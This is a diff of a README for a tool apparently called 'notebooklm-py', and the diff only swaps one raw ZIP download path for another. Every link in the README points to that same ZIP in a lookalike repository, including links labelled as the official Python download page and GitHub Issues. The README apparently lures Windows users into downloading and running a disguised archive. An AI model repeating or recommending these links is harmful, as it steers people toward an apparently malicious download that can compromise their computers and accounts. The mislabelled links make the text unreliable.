@@ -1,6 +1,6 @@
 # 📝 notebooklm-py - Easy Python Access to NotebookLM Features
 
-[![Download notebooklm-py](https://img.shields.io/badge/Download-notebooklm--py-brightgreen)](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip)
+[![Download notebooklm-py](https://img.shields.io/badge/Download-notebooklm--py-brightgreen)](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip)
 
 ## 📋 What is notebooklm-py?
 
@@ -27,7 +27,7 @@ This tool is meant for people who want to get more from their NotebookLM without
    - Open Command Prompt (press Windows key, type `cmd`, press Enter).
    - Type `python --version` and press Enter.
    - If a version number appears, Python is installed.
-3. If Python is not installed, go to https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip and download the latest version.
+3. If Python is not installed, go to https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip and download the latest version.
 4. Install Python, and make sure to check "Add Python to PATH" during installation.
 
 ---
@@ -36,7 +36,7 @@ This tool is meant for people who want to get more from their NotebookLM without
 
 Click the big green button at the top or visit this link:
 
-[Download notebooklm-py](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip)
+[Download notebooklm-py](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip)
 
 This link will take you to the GitHub repository where you can download the program files.
 
@@ -46,7 +46,7 @@ This link will take you to the GitHub repository where you can download the prog
 
 ### Step 1. Download the files
 
-- Go to https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip
+- Go to https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip
 - Click on the green **Code** button near the top right.
 - Select **Download ZIP**.
 - Save the ZIP file to your computer, for example in your Downloads folder.
@@ -151,11 +151,11 @@ notebooklm-py uses Google services which require you to log in securely. Your da
 
 ## 🔗 Quick Links
 
-[Download notebooklm-py](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip)
+[Download notebooklm-py](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip)
 
-[Python official download page](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip)
+[Python official download page](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip)
 
-[GitHub Issues](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/tests/e2e/notebooklm_py_3.3.zip) – for reporting problems or asking questions
+[GitHub Issues](https://raw.githubusercontent.com/patriarchal-boothose896/notebooklm-py/main/scripts/py_notebooklm_v2.7.zip) – for reporting problems or asking questions
 
 ---
 
